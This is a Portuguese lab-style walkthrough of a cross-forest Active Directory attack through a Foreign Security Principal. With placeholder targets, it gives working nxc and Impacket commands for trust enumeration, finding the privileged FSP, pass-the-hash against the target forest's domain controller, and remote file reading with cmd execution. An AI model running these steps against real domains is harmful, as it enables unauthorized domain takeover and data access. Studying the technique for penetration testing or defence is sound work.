# Cross-forest via FSP, execução conceitual

Sintaxe real, alvos genéricos. Continuação do DCSync do módulo 02.

Variáveis.

```
<dc-a-ip>       DC da floresta de origem (onde já se é Domain Admin)
<dc-b-ip>       DC da floresta alvo
<domain-a>      floresta de origem
<domain-b>      floresta alvo
<fsp-account>   conta de origem que é FSP na floresta alvo
<fsp-hash>      hash NT da conta fsp (obtido no DCSync do módulo 02)
<admin-hash>    hash NT do Administrator da floresta de origem
```

## Passo 1, enumerar o trust

Com Domain Admin na floresta de origem, enumere as relações de confiança a partir do DC.

```bash
nxc ldap <dc-a-ip> -u administrator -H <admin-hash> --dc-list
```

A saída revela o domínio confiável, a direção (bidirecional) e o tipo (transitiva de floresta), além do DC remoto. Técnica T1482.

Complemento com Impacket para ver a conta de trust e seu RID.

```bash
impacket-lookupsid '<domain-a>/administrator@<dc-a-ip>' \
  -hashes :<admin-hash> | grep -i foreign
```

## Passo 2, descobrir o Foreign Security Principal privilegiado

A pergunta certa, quais grupos da floresta alvo têm como membro o SID da conta de origem. Consulta LDAP no DC da floresta alvo, autenticando com o Administrator da origem através do trust.

```bash
nxc ldap <dc-b-ip> -u administrator -H <admin-hash> -d <domain-a> \
  --query "(member=CN=<sid-da-conta-origem>,CN=ForeignSecurityPrincipals,DC=<domain-b-dn>)" \
  "cn,distinguishedName"
```

Se a resposta trouxer `CN=Administrators,CN=Builtin,...`, está confirmado, a conta de origem é membro de Administrators (Builtin) da floresta alvo. Essa é a brecha central.

## Passo 3, Pass the Hash direto na conta FSP

Com o hash da conta FSP (recuperado no DCSync do módulo 02), autentica-se direto no DC da floresta alvo.

```bash
nxc smb <dc-b-ip> -u <fsp-account> -H <fsp-hash> -d <domain-a> --shares
```

Status `(Pwn3d!)` com `C$ READ,WRITE` confirma acesso administrativo ao DC da floresta alvo.

## Caminhos que não funcionaram (valor metodológico)

Documentar o que foi descartado mostra rigor e economiza tempo de quem estuda.

| Tentativa | Resultado |
|---|---|
| Pass the Hash com a conta de trust (`<FOREIGN>$`) | STATUS_LOGON_FAILURE, a conta de trust não serve para logon direto |
| DCSync direto na floresta alvo usando o Administrator da origem | ERROR_DS_NAME_ERROR_NOT_FOUND, o principal não existe como tal no alvo |
| getST abusando do trust com opção de target-domain | opção inexistente nesta versão do Impacket |

O caminho limpo foi o Pass the Hash direto da conta FSP, porque ela já era membro de Administrators na floresta alvo.

## Passo 4, objetivo na floresta alvo

Com acesso administrativo, a leitura de um arquivo no DC alvo pode ser feita remotamente, sem transferir o arquivo, quando o nome tem caracteres que atrapalham o download.

```bash
nxc smb <dc-b-ip> -u <fsp-account> -H <fsp-hash> -d <domain-a> \
  -x 'cmd /c type "C:\caminho\do\arquivo.txt"'
```

A execução remota com `cmd /c type` contorna erros de nome de arquivo (por exemplo espaço no nome, que quebra o `get` do smbclient com STATUS_OBJECT_NAME_INVALID).
